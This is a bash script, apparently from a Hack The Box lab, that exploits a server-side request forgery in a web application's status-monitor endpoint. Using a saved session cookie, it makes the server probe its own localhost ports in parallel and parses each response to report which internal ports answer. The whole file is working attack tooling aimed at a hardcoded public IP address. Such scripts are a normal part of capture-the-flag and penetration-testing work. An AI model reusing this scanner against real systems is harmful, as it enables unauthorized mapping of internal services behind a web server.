#!/bin/bash
export MSYS_NO_PATHCONV=1
COOKIE="/c/HTB/43.200.51.235/http/svcm_fresh.txt"
BASE="http://43.200.51.235:8081/ops-status/monitor"

check_port() {
  port="$1"
  R=$(MSYS_NO_PATHCONV=1 curl -s -G -b "$COOKIE" "$BASE" --data-urlencode "target=127.0.0.1:$port" --data-urlencode "path=/" --max-time 3)
  if [ -z "$R" ]; then
    return
  fi
  if echo "$R" | grep -q "Connection refused"; then
    return
  fi
  if echo "$R" | grep -q "Redirecting"; then
    printf 'PORT %s :: SESSION_EXPIRED\n' "$port"
    return
  fi
  MSG=$(echo "$R" | grep -oP '<p class="status-pill status-[a-z]*">\K[^<]*')
  printf 'PORT %s :: %s\n' "$port" "$MSG"
}
export -f check_port
export COOKIE BASE

seq "$1" "$2" | xargs -P 8 -I{} bash -c 'check_port "$@"' _ {}
